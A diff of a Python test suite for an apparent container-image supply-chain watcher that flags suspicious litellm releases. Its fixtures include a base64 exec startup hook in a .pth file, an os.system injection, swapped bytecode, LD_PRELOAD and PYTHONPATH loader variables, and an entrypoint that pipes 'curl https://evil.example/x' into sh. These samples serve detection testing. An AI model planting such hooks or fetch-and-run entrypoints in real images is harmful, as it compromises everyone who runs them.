@@ -27,6 +27,8 @@ _NIGHTLY = {**_RELEASE, "workflow": "BerriAI/project-releaser/.github/workflows/
 _BRANCH = {**_RELEASE, "builder": "BerriAI/litellm", "workflow": "BerriAI/litellm/.github/workflows/ghcr_deploy.yml@refs/heads/x",
            "protected": "false"}
 _ATTACK = {**_RELEASE, "source": "https://github.com/Berri-AI/litellm", "protected": "false"}
+_CONFIG = {"Entrypoint": ["docker/prod_entrypoint.sh"], "Cmd": ["--port", "4000"], "User": "nobody",
+           "WorkingDir": "/app", "Env": ["PATH=/app/.venv/bin:/usr/bin", "LITELLM_VERSION=1"]}
 
 
 def _provenance(source: str, builder: str, workflow: str, protected: str = "true", subject: str = "") -> dict:
@@ -40,8 +42,7 @@ def _provenance(source: str, builder: str, workflow: str, protected: str = "true
 
 
 class _Registry:
-    """A fake registry: each pushed tag an OCI index of platform images, each with its attestation manifest naming it; a
-    401 with a Bearer challenge until a token is asked for, and again once `expire()` is called."""
+    """A fake registry: each pushed tag an OCI index of platform images, each with its attestation manifest naming it; a 401 with a Bearer challenge until a token is asked for, and again once `expire()` is called."""
 
     def __init__(self):
         self.blobs: dict[str, bytes] = {}
@@ -57,13 +58,18 @@ class _Registry:
         store[digest] = raw
         return digest
 
-    def platform(self, provenance: dict | None) -> tuple[dict, dict | None]:
-        """A platform image and its attestation descriptor (None without provenance)."""
+    def platform(self, provenance: dict | None, arch: str = "amd64", layers: tuple[bytes, ...] = (),
+                 config: dict | None = None) -> tuple[dict, dict | None]:
+        """A platform image (its layers, gzipped tars, and its config, stored as blobs) and its attestation descriptor (None without provenance)."""
         self.pushes += 1
-        image = self._put(self.manifests, {"mediaType": "application/vnd.oci.image.manifest.v1+json", "layers": [],
-                                           "n": self.pushes})
+        descs = [{"mediaType": "application/vnd.oci.image.layer.v1.tar+gzip", "digest": self._put(self.blobs, layer),
+                  "size": len(layer)} for layer in layers]
+        blob = json.dumps({"architecture": arch, "config": config or _CONFIG}).encode()
+        cfg = {"mediaType": "application/vnd.oci.image.config.v1+json", "digest": self._put(self.blobs, blob), "size": len(blob)}
+        image = self._put(self.manifests, {"mediaType": "application/vnd.oci.image.manifest.v1+json", "config": cfg,
+                                           "layers": descs, "n": self.pushes})
         desc = {"mediaType": "application/vnd.oci.image.manifest.v1+json", "digest": image,
-                "platform": {"os": "linux", "architecture": f"arch{self.pushes}"}}
+                "platform": {"os": "linux", "architecture": arch}}
         if provenance is None:
             return desc, None
         statement = _provenance(**provenance, subject=image.split(":", 1)[1])
@@ -76,11 +82,12 @@ class _Registry:
                                       "vnd.docker.reference.digest": image},
                       "platform": {"os": "unknown", "architecture": "unknown"}}
 
-    def push(self, tag: str, *provenances: dict | None, entries: list[dict] | None = None) -> str:
+    def push(self, tag: str, *provenances: dict | None, entries: list[dict] | None = None,
+             layers: tuple[bytes, ...] = (), config: dict | None = None) -> str:
         if entries is None:
             entries = []
-            for prov in provenances or (_RELEASE,):
-                desc, att = self.platform(prov)
+            for i, prov in enumerate(provenances or (_RELEASE,)):
+                desc, att = self.platform(prov, ("amd64", "arm64", "s390x", "ppc64le")[i % 4], layers, config)
                 entries += [desc] + ([att] if att else [])
         index = self._put(self.manifests, {"mediaType": "application/vnd.oci.image.index.v1+json", "manifests": entries})
         self.tags[tag] = index
@@ -501,5 +508,264 @@ def test_the_first_sight_alert_is_sent_once_and_again_when_refused(tmp_path):
             w.poll_once()
         first = [p for p in sent if p["source"]["title"].endswith("(first sight)")]
         assert len(first) == 2                                       # refused, then sent again; never a new alert
+    finally:
+        w.close()
+
+
+# ── layers by content ────────────────────────────────────────────────────────────────────────────────────
+
+def _layer(files: dict[str, str | bytes], compress: bool = True) -> bytes:
+    import gzip
+    import io
+    import tarfile
+
+    buf = io.BytesIO()
+    with tarfile.open(fileobj=buf, mode="w") as tf:
+        for path, text in files.items():
+            data = text if isinstance(text, bytes) else text.encode()
+            info = tarfile.TarInfo(path)
+            info.size = len(data)
+            info.mtime = 0
+            tf.addfile(info, io.BytesIO(data))
+    return gzip.compress(buf.getvalue(), mtime=0) if compress else buf.getvalue()
+
+
+_BASE = _layer({"usr/bin/python3": b"\x7fELF...", "etc/os-release": "ID=debian\n"})
+_SITE = "usr/local/lib/python3.13/site-packages/"
+
+
+def _app(version: str, extra: dict | None = None) -> bytes:
+    return _layer({f"{_SITE}litellm/__init__.py": f"__version__ = '{version}'\n",
+                   f"{_SITE}litellm/proxy.py": "def serve():\n    return 1\n", **(extra or {})})
+
+
+def _layered(tmp_path, new_layers: tuple[bytes, ...], old_layers: tuple[bytes, ...] | None = None, tag: str = "v1.107.0"):
+    reg = _Registry()
+    reg.push("v1.106.2", _RELEASE, layers=old_layers or (_BASE, _app("1.106.2")))
+    reg.tags["latest"] = reg.tags["v1.106.2"]
+    w = _watcher(tmp_path, reg)
+    w.poll_once()
+    reg.push(tag, _RELEASE, layers=new_layers)
+    return reg, w
+
+
+def test_a_payload_in_a_changed_layer_is_screened(tmp_path):
+    payload = {f"{_SITE}litellm_init.pth": "import os, base64; exec(base64.b64decode('cHJpbnQoMSk='))\n"}
+    reg, w = _layered(tmp_path, (_BASE, _app("1.107.0", payload)))
+    try:
+        results = w.poll_once()
+        strong = _strong(results)["v1.107.0"]
+        assert "python-startup-hook" in strong
+        assert results[0]["signal"]
+        blobs = [u for m, u in reg.calls if "/blobs/" in u]
+        assert not any(_BASE_DIGEST in u for u in blobs)           # the shared base layer is never downloaded
+    finally:
+        w.close()
+
+
+_BASE_DIGEST = "sha256:" + __import__("hashlib").sha256(_BASE).hexdigest()
+
+
+def test_a_rebuilt_layer_shows_only_what_changed(tmp_path):
+    _, w = _layered(tmp_path, (_BASE, _app("1.107.0")))
+    try:
+        results = w.poll_once()
+        assert not results[0]["signal"] and not _strong(results)["v1.107.0"]
+    finally:
+        w.close()
+
+
+def test_a_whiteout_removes_what_is_beneath_it(tmp_path):
+    old = (_BASE, _app("1.106.2", {f"{_SITE}old.pth": "import sys\n"}))
+    new = (_BASE, _app("1.107.0", {f"{_SITE}old.pth": "import sys\n"}), _layer({f"{_SITE}.wh.old.pth": ""}))
+    _, w = _layered(tmp_path, new, old)
+    try:
+        assert not _strong(w.poll_once())["v1.107.0"]
+    finally:
+        w.close()
+
+
+@pytest.mark.parametrize("bad", ["digest", "zstd", "size", "platform"])
+def test_a_layer_that_cannot_be_read_alerts(tmp_path, bad, monkeypatch):
+    from diff_sentry import images
+
+    reg = _Registry()
+    reg.push("v1.106.2", _RELEASE, layers=(_BASE, _app("1.106.2")))
+    w = _watcher(tmp_path, reg)
+    try:
+        w.poll_once()
+        app = _app("1.107.0")
+        if bad == "zstd":
+            app = b"\x28\xb5\x2f\xfd" + app[4:]
+        if bad == "size":
+            monkeypatch.setattr(images, "_MAX_LAYER_BYTES", 10)
+        index = reg.push("v1.107.0", _RELEASE, layers=(_BASE, app))
+        if bad == "digest":
+            digest = "sha256:" + __import__("hashlib").sha256(app).hexdigest()
+            reg.blobs[digest] = app + b"tampered"
+        if bad == "platform":
+            index = reg.push("v1.107.0", _RELEASE, _RELEASE, layers=(_BASE, app))     # an arm64 image the previous lacked
+        assert index
+        assert "release-not-fully-read" in _strong(w.poll_once())["v1.107.0"]
+    finally:
+        w.close()
+
+
+def test_a_floating_tag_is_compared_with_the_image_it_pointed_at(tmp_path):
+    reg = _Registry()
+    reg.push("v1.106.2", _RELEASE, layers=(_BASE, _app("1.106.2")))
+    reg.tags["latest"] = reg.tags["v1.106.2"]
+    w = _watcher(tmp_path, reg)
+    try:
+        w.poll_once()
+        reg.push("moved", _RELEASE, layers=(_BASE, _app("1.106.2", {f"{_SITE}x.pth": "import os;os.system('id')\n"})))
+        reg.tags["latest"] = reg.tags.pop("moved")
+        strong = _strong(w.poll_once())
+        assert "python-startup-hook" in strong["latest"]
+    finally:
+        w.close()
+
+
+def _pyc(source: str, path: str, header: bytes = b"\0" * 12, magic: bytes | None = None) -> bytes:
+    """A real `.pyc` of this interpreter: its magic, a 12-byte header, and the source compiled (never run)."""
+    import importlib.util
+    import marshal
+
+    return (magic or importlib.util.MAGIC_NUMBER) + header + marshal.dumps(compile(source, "/" + path, "exec", dont_inherit=True))
+
+
+_PROXY = f"{_SITE}litellm/proxy.py"
+_PROXY_PYC = f"{_SITE}litellm/__pycache__/proxy.cpython-313.pyc"
+
+
+def _bytecode_case(tmp_path, source: str, pyc: bytes) -> set[str]:
+    old = (_BASE, _app("1.106.2", {_PROXY_PYC: _pyc("def serve():\n    return 1\n", _PROXY)}))
+    _, w = _layered(tmp_path, (_BASE, _app("1.107.0", {_PROXY: source, _PROXY_PYC: pyc})), old)
+    try:
+        return _strong(w.poll_once())["v1.107.0"]
+    finally:
+        w.close()
+
+
+def test_bytecode_that_is_its_source_compiled_is_not_unread_code(tmp_path):
+    new = "def serve():\n    return 2\n"
+    assert "release-code-not-read" not in _bytecode_case(tmp_path, new, _pyc(new, _PROXY))
+    # only the header moved (a rebuild's source mtime): not a change at all
+    old = "def serve():\n    return 1\n"
+    assert "release-code-not-read" not in _bytecode_case(tmp_path / "h", old, _pyc(old, _PROXY, header=b"\1" * 12))
+
+
+def test_bytecode_that_is_not_its_source_alerts(tmp_path):
+    # a harmless edit to the source, and bytecode compiled from something else beside it
+    swapped = _pyc("import os\nos.system('id')\n", _PROXY)
+    assert "release-code-not-read" in _bytecode_case(tmp_path, "def serve():\n    return 2  # tidy\n", swapped)
+
+
+def test_bytecode_no_interpreter_here_can_check_alerts(tmp_path):
+    new = "def serve():\n    return 2\n"
+    assert "release-code-not-read" in _bytecode_case(tmp_path, new, _pyc(new, _PROXY, magic=b"\x01\x00\r\n"))
+
+
+_PAYLOAD_PTH = {f"{_SITE}litellm_init.pth": "import os, base64; exec(base64.b64decode('cHJpbnQoMSk='))\n"}
+
+
+def test_an_opaque_whiteout_after_the_payload_in_its_own_layer_hides_nothing(tmp_path):
+    extra = _layer({**_PAYLOAD_PTH, f"{_SITE}.wh..wh..opq": ""})
+    _, w = _layered(tmp_path, (_BASE, _app("1.107.0"), extra))
+    try:
+        assert "python-startup-hook" in _strong(w.poll_once())["v1.107.0"]
+    finally:
+        w.close()
+
+
+def test_two_images_for_one_platform_compare_the_first_and_alert(tmp_path):
+    reg = _Registry()
+    reg.push("v1.106.2", _RELEASE, layers=(_BASE, _app("1.106.2")))
+    w = _watcher(tmp_path, reg)
+    try:
+        w.poll_once()
+        bad, bad_att = reg.platform(_RELEASE, "amd64", (_BASE, _app("1.107.0", _PAYLOAD_PTH)))
+        good, good_att = reg.platform(_RELEASE, "amd64", (_BASE, _app("1.107.0")))
+        reg.push("v1.107.0", entries=[bad, good, bad_att, good_att])
+        strong = _strong(w.poll_once())["v1.107.0"]
+        assert {"python-startup-hook", "release-not-fully-read"} <= strong
+    finally:
+        w.close()
+
+
+def test_attestation_entries_do_not_crowd_out_the_platform_images(tmp_path):
+    reg = _Registry()
+    reg.push("v1.106.2", _RELEASE, layers=(_BASE, _app("1.106.2")))
+    w = _watcher(tmp_path, reg)
+    try:
+        w.poll_once()
+        image, att = reg.platform(_RELEASE, "amd64", (_BASE, _app("1.107.0", _PAYLOAD_PTH)))
+        reg.push("v1.107.0", entries=[att] * 32 + [image])
+        assert "python-startup-hook" in _strong(w.poll_once())["v1.107.0"]
+    finally:
+        w.close()
+
+
+def test_a_repository_without_release_tags_compares_with_its_floating_tag(tmp_path):
+    reg = _Registry()
+    reg.push("sha-aaa", _RELEASE, layers=(_BASE, _app("1")))
+    reg.tags["latest"] = reg.tags["sha-aaa"]
+    w = _watcher(tmp_path, reg)
+    try:
+        w.poll_once()
+        reg.push("sha-bbb", _RELEASE, layers=(_BASE, _app("2", _PAYLOAD_PTH)))      # latest left where it was
+        assert "python-startup-hook" in _strong(w.poll_once())["sha-bbb"]
+    finally:
+        w.close()
+
+
+def test_a_large_member_is_hashed_without_being_held():
+    import gzip
+    import io
+    import tarfile
+
+    from diff_sentry import releases
+
+    size = 3 << 20
+    buf = io.BytesIO()
+    with tarfile.open(fileobj=buf, mode="w") as tf:
+        info = tarfile.TarInfo("app/big.py")
+        info.size = size
+        tf.addfile(info, io.BytesIO(b"\0" * size))
+    art = releases.Artifact("layer", "linux-amd64")
+    releases._read_tar(art, gzip.compress(buf.getvalue()), releases._Budget(), path_of=lambda p: p)
+    member = art.members["app/big.py"]
+    assert member.text is None and member.unread == "larger than 1 MiB" and member.size == size and member.blobs
+
+
+
+@pytest.mark.parametrize(("change", "rule"), [
+    ({"Entrypoint": ["sh", "-c", "curl -s https://evil.example/x | sh; exec docker/prod_entrypoint.sh"]}, "image-run-config-changed"),
+    ({"Env": [*_CONFIG["Env"], "LD_PRELOAD=/tmp/x.so"]}, "image-loader-env"),
+    ({"Env": ["PATH=/app/.venv/bin:/usr/bin", "LITELLM_VERSION=1", "PYTHONPATH=/tmp/x"]}, "image-loader-env"),
+    ({"Env": [*_CONFIG["Env"], "PYTHONWARNINGS=ignore::litellm_init.Warn"]}, "image-loader-env"),
+    ({"Env": [*_CONFIG["Env"], "LD_PROFILE=libc.so.6"]}, "image-loader-env"),
+])
+def test_a_config_change_over_the_same_layers_alerts(tmp_path, change, rule):
+    reg = _Registry()
+    reg.push("v1.106.2", _RELEASE, layers=(_BASE, _app("1.106.2")))
+    w = _watcher(tmp_path, reg)
+    try:
+        w.poll_once()
+        reg.push("v1.107.0", _RELEASE, layers=(_BASE, _app("1.106.2")), config={**_CONFIG, **change})   # every layer reused
+        assert rule in _strong(w.poll_once())["v1.107.0"]
+    finally:
+        w.close()
+
+
+def test_a_routine_config_change_is_only_screened(tmp_path):
+    reg = _Registry()
+    reg.push("v1.106.2", _RELEASE, layers=(_BASE, _app("1.106.2")))
+    w = _watcher(tmp_path, reg)
+    try:
+        w.poll_once()
+        reg.push("v1.107.0", _RELEASE, layers=(_BASE, _app("1.107.0")), config={**_CONFIG, "Env": ["PATH=/app/.venv/bin:/usr/bin", "LITELLM_VERSION=2"]})
+        result = w.poll_once()[0]
+        assert not result["signal"]
     finally:
         w.close()
